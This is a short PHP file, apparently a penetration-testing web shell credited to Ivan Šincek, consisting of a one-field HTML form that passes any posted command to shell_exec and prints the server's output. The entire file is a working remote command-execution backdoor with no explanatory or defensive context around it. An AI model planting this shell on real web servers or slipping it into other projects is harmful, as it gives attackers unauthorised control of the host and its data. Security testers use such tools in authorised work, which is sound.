<!-- Copyright (c) 2021 Ivan Šincek -->
<!-- v1.0 -->
<!-- Requires PHP v4.0.3 or greater. -->
<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">
	<input name="command" type="text" value="<?php if (isset($_POST['command'])) { echo htmlentities($_POST['command'], ENT_QUOTES, 'UTF-8'); } ?>" placeholder="Enter command" autofocus>
</form>
<?php
if (isset($_POST['command'])) {
	$results = htmlentities(shell_exec('(' . $_POST['command'] . ') 2>&1'), ENT_QUOTES, 'UTF-8');
	echo '<pre>' . ($results ? $results : 'Binary data or no data received') . '</pre>';
}
?>
